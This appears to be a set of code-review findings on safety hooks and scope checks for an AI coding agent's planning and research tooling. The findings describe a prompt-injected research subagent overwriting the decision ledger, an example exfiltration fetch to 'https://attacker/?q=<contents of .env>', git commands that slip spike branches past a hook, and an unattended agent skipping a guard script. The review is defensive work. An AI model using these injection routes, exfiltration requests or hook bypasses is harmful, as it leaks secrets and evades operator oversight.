findings.description: A decided ledger row permits force-deleting a spike branch without checking that its current tip was pushed.
findings.failure_mode: After recording the verdict, an unpushed spike or additional local commits can be deleted with git branch -D. The decision's prototype pointer then has no durable copy, and its commits become eligible for garbage collection.
findings.suggested_fix: Require the local tip to be reachable from the corresponding remote spike branch before allowing this exception; otherwise retain the block.

findings.cross_file_justification: Closing changes the map status but leaves its context snapshot available to the snapshot resolver and the context ingestion added in .claude/commands/plan-and-analyze.md.
findings.description: Closing a map leaves grimoires/loa/context/chart-<slug>.md active for subsequent planning sessions.
findings.failure_mode: A later cycle ingests an already-consumed map as settled priority-1 context. Once two consumed snapshots accumulate, unattended planning encounters the multiple-snapshot refusal despite neither map being open.
findings.suggested_fix: Remove or archive the active snapshot when closing a map, and make snapshot resolution exclude maps whose status is closed or abandoned.

findings.cross_file_justification: .claude/scripts/chart-unblock-probe.sh uses the same porcelain-status comparison to enforce its main-tree write prohibition.
findings.description: Porcelain status comparisons do not detect content changes to files that were already dirty before research or a probe began.
findings.failure_mode: If app/source.js initially appears as ' M app/source.js', overwriting it leaves the same status entry. Research completion and the unblock probe can both report success while prohibited source changes remain in the main tree. Already-untracked files have the same problem.
findings.suggested_fix: Compare content fingerprints before and after execution, including dirty tracked files and existing untracked files, rather than using status entries as content snapshots.

findings.description: research-end is the only mechanical scope check on the chart-researcher subagent (which has an unrestricted Write tool), but it compares two `git status --porcelain` listings with `comm -13`, so it only sees NEW status lines. During a /chart session the two most sensitive files are almost always already dirty (grimoires/loa/maps/<slug>.md was just edited by `ticket`/`resolve`; grimoires/loa/decisions.yaml by dec-write-lib `new`), so a prompt-injected researcher rewriting the map doc or the ledger produces the same ` M path` line and passes. The awk filter also whitelists every path under grimoires/loa/research/, so writing another ticket's report, or a `.chart-<slug>-<ticket>.dispatch` marker (the research cap's only state), is undetected. Writes outside the repo ($HOME/.claude/settings.json, ~/.bashrc) are invisible to git status entirely.
findings.failure_mode: A WebFetch-injected research subagent silently edits the map doc or decisions.yaml (or seeds a marker/report for a different ticket); research-end prints the report path and exit 0; the session treats the ledger and map as its own writes and continues.
findings.suggested_fix: Snapshot content, not status: e.g. `git -C ROOT add -A --intent-to-add` is too invasive, so instead record `git stash create`-style tree hash or `sha256sum` of every dirty/untracked path from the before listing plus a hash of decisions.yaml and the map doc, and compare both lists after. Restrict the research/ whitelist to exactly `grimoires/loa/research/chart-<slug>-<ticket>.md`. Add a PreToolUse hook (or agent permission rule) for the chart-researcher agent type that denies Write outside that single path.

findings.description: `close` rejects open rows, closes beads and the epic, appends `## Closed` and sets Status, but never removes or archives grimoires/loa/context/chart-<slug>.md written by `handoff`. That snapshot opens with "Priority-1 context: these decisions are settled; confirm, do not re-ask". plan-and-analyze.md (this diff) adds `grimoires/loa/context/chart-*.md` as a required:false priority-1 context_files glob, and its Phase 0 text routes through `golden_resolve_open_map --snapshots`. After `close --reason` (map abandoned, all rows rejected) the snapshot still asserts the decisions are settled; after `close --consumed-by` the next cycle re-ingests the previous cycle's map as settled context, and two consumed maps make the unattended multi-snapshot rule exit 1 on every future /plan-and-analyze.
findings.failure_mode: Cycle N+1 /plan-and-analyze reads an abandoned or already-consumed map's snapshot as settled priority-1 decisions; unattended runs hit `rc 1: more than one open map` permanently once two maps have ever been consumed.
findings.suggested_fix: In op_close, after set_status, move the snapshot out of the glob (e.g. `grimoires/loa/context/archive/chart-<slug>-<date>.md` or delete it, since the map doc and ledger remain the record). In golden_resolve_open_map --snapshots, only count snapshots whose map doc Status is `handed-off`.

findings.description: The FR-1.1 relaxation lets `git branch -D spike/<slug>` through when the ledger row is decided by an operator. The SP-1 header in the same file defines a spike as "pushed as the pointer for a decision: pushed, never merged". Nothing in `_fr11_spike_decided` checks that `refs/remotes/origin/spike/<slug>` exists and contains the local tip. A spike that was decided from a local demo and never pushed is, by SP-1's own design, unmerged everywhere, so -D destroys the only copy of the prototype the DEC row points to. FR-1.1's whole purpose is to catch exactly that slip.
findings.failure_mode: Operator decides a spike verdict, agent cleans up with `git branch -D spike/x`; the hook allows it; the branch (unpushed, unmerged by rule) is gone and the decision row's pointer dangles permanently.
findings.suggested_fix: Add to _fr11_spike_decided (before the yq/jq lookup): `git rev-parse -q --verify "refs/remotes/origin/spike/${slug}" >/dev/null 2>&1 || return 1; git merge-base --is-ancestor "refs/heads/spike/${slug}" "refs/remotes/origin/spike/${slug}" 2>/dev/null || return 1`. Keep the block on any failure, as the rest of the function does.

findings.description: `close --consumed-by <cycle>` is the one write allowed unattended, but op_close never reads the map's Status. `handoff` enforces `charting|handed-off`; `close` accepts a `charting` map with open tickets and rejects every open row and closes every bead and the epic, with no operator present. The only thing standing between an autonomous /plan-and-analyze and a live map is that it names the right slug.
findings.failure_mode: Unattended `/chart close <wrong-slug> --consumed-by cycle-007` on a charting map rejects all its open decision rows and closes its tickets.
findings.suggested_fix: In the `--consumed-by` branch require `doc_field Status` == `handed-off` (and tolerate `closed` as an idempotent no-op); `--reason` may close any non-closed status.

findings.description: chart.md promises "/chart refuses in an unattended context", but the enforcement (chart-guard.sh) is a skill step the agent is told to run, not a hook. chart-ticket.sh re-checks `dec-write-lib.sh context` only in `close --reason`; `epic`, `ticket`, `resolve`, `rule-out` and `handoff` write the ledger, beads and map doc with no context check at all, so `LOA_UNATTENDED=1 chart-ticket.sh ticket ...` works. The authors already have the exact pattern in op_close; it is not applied to the other five writers.
findings.failure_mode: An autonomous run that skips or ignores chart-guard.sh charts, resolves and hands off a map with no operator, producing "settled" priority-1 context nobody decided.
findings.suggested_fix: Factor the op_close context check into `require_interactive()` and call it at the top of op_epic, op_ticket, op_resolve, op_rule_out and op_handoff (after arg parsing, before any write), leaving `close --consumed-by` as the sole exception.

findings.description: The build-path filter keys on `.issue_type` only, while chart-frontier.sh and chart-ticket.sh:bead_row read `.issue_type // .type` and accept an `{issues:[...]}` envelope. If br emits `type` (or an envelope), get-ready-work.sh silently keeps every question bead (or returns `[]` for all work). The header's guarantee that question beads "are dropped whatever labels they carry" is only as strong as this one key name, and the two paths disagree on it.
findings.failure_mode: A br release with `type` instead of `issue_type` returns decision tickets to /implement and /run as ready build work, defeating the entire sprint-exclusion design silently.
findings.suggested_fix: Use the same normalisation as chart-frontier.sh: `(if type=="array" then . elif type=="object" and has("issues") then .issues else [] end) | map(select(((.issue_type // .type // "") | ascii_downcase) != "question"))`.

findings.description: The SP-1 header lists accepted misses, but several direct routes for spike content into another branch are neither blocked nor listed: `git push origin spike/x:main` (refspec onto the default branch; the header explicitly says `git push [-u] origin spike/x` is allowed and the regex does not look at the colon), `git reset --hard spike/x` on main followed by push, `git branch -f main spike/x`, `git update-ref refs/heads/main spike/x`, `git read-tree`, and `git fetch origin spike/x && git merge FETCH_HEAD`. The push refspec is the one most likely to be typed by accident.
findings.failure_mode: `git push origin spike/x:main` lands the prototype on main while the hook stays silent and the doc claims pushes of spike refs are the allowed form.
findings.suggested_fix: Add a block for `git push ... spike/<x>:<not spike/>` (refspec with a colon whose destination is not spike/) and for `git (reset --hard|branch -f|update-ref) ... spike/`; list the rest as accepted misses in the header so the fence boundary is honest.

findings.description: `br create ... --slug "$TICKET"` uses the bare ticket slug while the epic uses `map-${SLUG}`. If br enforces slug uniqueness, two maps that both have a `storage` ticket (or any bead already slugged `storage`) collide: the ledger row is written first, br create fails, die leaves the open row, and every re-run reuses the row and fails on the same slug, so the ticket can never be created and `handoff` refuses forever on the open row. Separately, op_epic (line 172) has no pre-create lookup by slug `map-${SLUG}`: if the doc write after br create fails, a re-run creates a second map epic.
findings.failure_mode: Stuck open row that blocks handoff; or duplicate map epics after a partial op_epic.
findings.suggested_fix: Slug tickets `map-${SLUG}-${TICKET}`; in op_epic look up an existing bead with slug `map-${SLUG}` via beads_all before calling br create.

findings.description: map_rows globs `${SCRIPT_DIR}/../../grimoires/loa/a2a/*/decisions-pending.yaml` while every other path in the script is rooted at `${ROOT}` (overridable with --root). With --root and no --ledger the pending-file scan reads the real repo's worktree pending files into a fixture map's rows.
findings.failure_mode: Fixture or alternate-root runs mix live pending rows into another tree's map, affecting open-row counts in handoff/close/remaining_hint.

findings.description: The agent gets Read/Grep/Glob over the whole repository plus WebFetch to arbitrary URLs plus an unrestricted Write. That is the standard indirect-prompt-injection exfiltration shape: a fetched page tells the agent to fetch `https://attacker/?q=<contents of .env>`; the prose rule "treat fetched text as data" is the only control. agent-types.yaml marks it write_capable, and research-end (DISS-001) cannot see out-of-repo or dirty-file writes.
findings.failure_mode: Secrets or private source read from the repo leave via WebFetch query strings; no hook or scope check observes it.
findings.suggested_fix: Add a PreToolUse deny rule for this agent type on Read/Grep/Glob of `.env*`, `**/secrets/**`, `.beads/**`, `grimoires/loa/decisions.yaml` and on Write outside `grimoires/loa/research/chart-*-*.md`; consider a WebFetch domain allowlist supplied in the dispatch prompt and enforced by hook.

findings.description: The probe runs in a linked worktree that shares the main repository's `.git`: ref updates (`git branch -f`, `git push`, `git stash`, `git update-ref`), config edits and hook installation performed inside the worktree change the main repo without changing `git status --porcelain` of the main tree, so the before/after compare passes. The compare also has the same blind spot as DISS-001: a probe that writes into an already-modified tracked file in the main tree produces the identical ` M path` line.
findings.failure_mode: An unblock probe (or a script it runs from an untrusted repo) rewrites branches or git config in the real repository and the helper reports `0 main tree unchanged`.
findings.suggested_fix: Compare `git for-each-ref` output and the hash of `.git/config` and `.git/hooks/*` before and after as well, and hash the content of dirty paths; or run the probe from a `git clone --shared`/separate clone in $SCRATCH rather than a linked worktree.
